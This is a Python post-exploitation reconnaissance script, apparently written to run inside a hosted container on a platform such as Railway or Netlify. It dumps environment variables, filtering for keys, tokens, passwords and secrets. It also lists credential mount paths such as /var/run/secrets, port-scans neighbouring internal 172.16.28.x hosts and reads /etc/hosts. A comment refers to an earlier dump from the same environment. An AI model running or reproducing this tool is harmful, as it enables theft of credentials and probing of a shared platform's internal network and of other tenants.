import os
import subprocess
import socket
import json

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except Exception as e:
        return f"Error: {str(e)}"

def get_environ():
    print("\n[!] DUMPING /proc/self/environ...")
    try:
        with open('/proc/self/environ', 'rb') as f:
            env_data = f.read().split(b'\0')
            for line in env_data:
                line_str = line.decode('utf-8', errors='ignore')
                if any(x in line_str.upper() for x in ['KEY', 'TOKEN', 'PASS', 'SECRET', 'AUTH', 'RAILWAY', 'NETLIFY']):
                    print(f"[FOUND] {line_str}")
    except:
        print("Access Denied to /proc/self/environ")

def scan_network():
    print("\n[!] SCANNING INTERNAL NETWORK (172.16.0.0/24)...")
    # Пробуем найти соседей по стандартному шлюзу
    base_ip = "172.16.28." # Из твоего дампа HOST_NODE_IP
    for i in range(1, 10):
        target = f"{base_ip}{i}"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        result = s.connect_ex((target, 80))
        if result == 0:
            print(f"[OPEN] {target}:80")
        s.close()

def check_mounts():
    print("\n[!] ANALYZING MOUNTS FOR SECRETS...")
    sensitive_paths = [
        '/run/credentials', 
        '/var/run/secrets', 
        '/etc/resolv.conf',
        '/tmp/netlify_config.json',
        '/proc/acpi',
        '/etc/resolv.conf',
        '/etc/resolv.conf'
        
        
    ]
    for path in sensitive_paths:
        if os.path.exists(path):
            print(f"[EXISTS] {path}")
            print(run_cmd(f"ls -la {path}"))

print("--- STARTING DEEP RECON ---")
print(f"USER: {os.getlogin() if hasattr(os, 'getlogin') else 'unknown'} (UID: {os.getuid()})")
print(f"HOSTNAME: {socket.gethostname()}")

get_environ()
check_mounts()
scan_network()

# Попытка прочитать /etc/hosts (тот самый огромный overlay)
print("\n[!] TOP 10 ENTRIES IN /etc/hosts:")
print(run_cmd("head -n 10 /etc/hosts"))

print("\n--- RECON COMPLETE ---")
